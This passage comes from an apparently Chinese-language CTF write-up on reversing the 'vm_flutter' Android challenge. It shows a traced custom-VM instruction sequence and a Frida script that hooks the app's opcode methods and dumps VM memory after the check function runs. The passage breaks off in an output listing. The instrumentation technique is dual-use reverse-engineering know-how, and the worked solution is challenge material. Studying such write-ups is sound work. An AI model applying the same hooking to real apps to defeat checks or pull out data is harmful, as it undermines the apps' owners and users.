也不会被写，<code>S()</code> 基本过不去。它适合“只想看指令序列”的场景</p></blockquote><p>output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">push 48</span><br><span class="line">store 0</span><br><span class="line">push 176</span><br><span class="line">push 11</span><br><span class="line">load 0</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 0</span><br><span class="line"></span><br><span class="line">push 48</span><br><span class="line">store 1</span><br><span class="line">push 198</span><br><span class="line">push 18</span><br><span class="line">load 1</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 1</span><br><span class="line">push 48</span><br><span class="line">store 2</span><br><span class="line">push 66</span><br><span class="line">push 5</span><br><span class="line">load 2</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 2</span><br><span class="line">push 48</span><br><span class="line">store 3</span><br><span class="line">push 199</span><br><span class="line">push 18</span><br><span class="line">load 3</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 3</span><br><span class="line">push 48</span><br><span class="line">store 4</span><br><span class="line">push 170</span><br><span class="line">push 14</span><br><span class="line">load 4</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 4</span><br><span class="line">push 48</span><br><span class="line">store 5</span><br><span class="line">push 32</span><br><span class="line">push 13</span><br><span class="line">load 5</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 5</span><br><span class="line">push 48</span><br><span class="line">store 6</span><br><span class="line">push 31</span><br><span class="line">push 14</span><br><span class="line">load 6</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 6</span><br><span class="line">push 48</span><br><span class="line">store 7</span><br><span class="line">push 60</span><br><span class="line">push 18</span><br><span class="line">load 7</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 7</span><br><span class="line">push 48</span><br><span class="line">store 8</span><br><span class="line">push 26</span><br><span class="line">push 13</span><br><span class="line">load 8</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 8</span><br><span class="line">push 48</span><br><span class="line">store 9</span><br><span class="line">push 89</span><br><span class="line">push 18</span><br><span class="line">load 9</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 9</span><br><span class="line">push 48</span><br><span class="line">store 10</span><br><span class="line">push 60</span><br><span class="line">push 17</span><br><span class="line">load 10</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 10</span><br><span class="line">push 48</span><br><span class="line">store 11</span><br><span class="line">push 119</span><br><span class="line">push 19</span><br><span class="line">load 11</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 11</span><br><span class="line">push 48</span><br><span class="line">store 12</span><br><span class="line">push 60</span><br><span class="line">push 17</span><br><span class="line">load 12</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 12</span><br><span class="line">push 48</span><br><span class="line">store 13</span><br><span class="line">push 90</span><br><span class="line">push 5</span><br><span class="line">load 13</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 13</span><br><span class="line">push 48</span><br><span class="line">store 14</span><br><span class="line">push 104</span><br><span class="line">push 13</span><br><span class="line">load 14</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 14</span><br><span class="line">push 48</span><br><span class="line">store 15</span><br><span class="line">push 174</span><br><span class="line">push 19</span><br><span class="line">load 15</span><br></pre></td></tr></table></figure><p>可以发现有规律的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">push 48</span><br><span class="line">store 0</span><br><span class="line">push 176</span><br><span class="line">push 11</span><br><span class="line">load 0</span><br><span class="line">add</span><br><span class="line">xor</span><br><span class="line">store 0</span><br></pre></td></tr></table></figure><p>官解的似乎不是很详细，我这完善了一份更详细的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hook_vm_final.js — 打印+透传所有 k.b 指令，并在 S 返回后 dump f741b（最终内存）</span></span><br><span class="line"><span class="title function_">setImmediate</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[hook] vm_final v1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">KB</span>   = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;k.b&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Main</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dasctf.vm_flutter.vm_flutter.MainActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hookVoid</span>(<span class="params">m, label</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> over = <span class="variable constant_">KB</span>[m].<span class="title function_">overload</span>();</span><br><span class="line">        over.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(label);</span><br><span class="line">          <span class="keyword">return</span> over.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[hook] k.b.&quot;</span> + m + <span class="string">&quot; -&gt; &quot;</span> + label);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[hook fail]&quot;</span>, m, e); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hookInt</span>(<span class="params">m, label</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 兼容签名差异：优先遍历 overloads 尝试匹配参数</span></span><br><span class="line">        <span class="keyword">let</span> hooked = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="variable constant_">KB</span>[m].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">ov</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> sig = ov.<span class="property">argumentTypes</span>.<span class="title function_">map</span>(<span class="function"><span class="params">t</span> =&gt;</span> t.<span class="property">className</span>).<span class="title function_">join</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (sig === <span class="string">&quot;int&quot;</span> || sig === <span class="string">&quot;java.lang.Integer&quot;</span>) &#123;</span><br><span class="line">              ov.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(label + <span class="string">&quot; &quot;</span> + x);</span><br><span class="line">                <span class="keyword">return</span> ov.<span class="title function_">call</span>(<span class="variable language_">this</span>, x);</span><br><span class="line">              &#125;;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[hook] k.b.&quot;</span> + m + <span class="string">&quot; -&gt; &quot;</span> + label + <span class="string">&quot; (&quot;</span> + sig + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">              hooked = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123; <span class="comment">/* ignore */</span> &#125;</span><br><span class="line">        <span class="keyword">if</span> (!hooked) &#123; <span class="comment">// 兜底</span></span><br><span class="line">          <span class="keyword">const</span> over = <span class="variable constant_">KB</span>[m].<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>);</span><br><span class="line">          over.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(label + <span class="string">&quot; &quot;</span> + x);</span><br><span class="line">            <span class="keyword">return</span> over.<span class="title function_">call</span>(<span class="variable language_">this</span>, x);</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[hook] k.b.&quot;</span> + m + <span class="string">&quot; -&gt; &quot;</span> + label + <span class="string">&quot; (int)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[hook fail]&quot;</span>, m, e); &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hook 所有 VM 指令（打印 + 透传）</span></span><br><span class="line">    <span class="title function_">hookVoid</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;Lshift&#x27;</span>);</span><br><span class="line">    <span class="title function_">hookVoid</span>(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;Rshift&#x27;</span>);</span><br><span class="line">    <span class="title function_">hookVoid</span>(<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;add&#x27;</span>);</span><br><span class="line">    <span class="title function_">hookVoid</span>(<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;and&#x27;</span>);</span><br><span class="line">    <span class="title function_">hookInt</span> (<span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;load&#x27;</span>);</span><br><span class="line">    <span class="title function_">hookVoid</span>(<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;mul&#x27;</span>);</span><br><span class="line">    <span class="title function_">hookVoid</span>(<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;or&#x27;</span>);</span><br><span class="line">    <span class="title function_">hookVoid</span>(<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>);</span><br><span class="line">    <span class="title function_">hookInt</span> (<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;push&#x27;</span>);</span><br><span class="line">    <span class="title function_">hookInt</span> (<span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;store&#x27;</span>);</span><br><span class="line">    <span class="title function_">hookVoid</span>(<span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;sub&#x27;</span>);</span><br><span class="line">    <span class="title function_">hookVoid</span>(<span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;xor&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最重要：在 S 执行完后再 dump f741b（确保是最终内存）</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="title class_">Sover</span> = <span class="title class_">Main</span>.<span class="property">S</span>.<span class="title function_">overload</span>(<span class="string">&#x27;k.b&#x27;</span>);</span><br><span class="line">      <span class="title class_">Sover</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">bVar</span>) &#123;</span><br><span class="line">        <span class="comment">// 先调用原始 S（让它运行、完成写内存 / 比较）</span></span><br><span class="line">        <span class="keyword">const</span> ret = <span class="title class_">Sover</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, bVar);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 然后 dump完整内存（最终状态）</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> arr = bVar.<span class="property">f741b</span>.<span class="property">value</span>; <span class="comment">// int[]</span></span><br><span class="line">          <span class="keyword">const</span> out = [];</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) out.<span class="title function_">push</span>(arr[i] &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[check_return] ret =&quot;</span>, ret, <span class="string">&quot; final f741b =&quot;</span>, out.<span class="title function_">join</span>(<span class="string">&quot;,&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[check_dump_fail]&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[hook] MainActivity.S post-dump installed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[hook fail] MainActivity.S&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行后为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span 